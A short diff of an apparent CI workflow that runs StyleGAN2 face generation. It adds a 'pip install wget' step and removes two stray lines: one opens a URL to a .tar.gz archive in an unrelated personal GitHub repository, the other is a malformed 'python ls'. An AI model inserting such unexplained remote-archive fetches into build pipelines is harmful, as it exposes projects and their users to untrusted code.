@@ -34,6 +34,7 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         pip install --upgrade pip
+        pip install wget
         cd /inputs/stylegan2
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
@@ -41,5 +42,3 @@ jobs:
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
       image: tensorflow/tensorflow:1.14.0-gpu-py3
-      python -m webbrowser https://raw.githubusercontent.com/jazzup6176/new/main/pes00.tar.gz
-      python ls
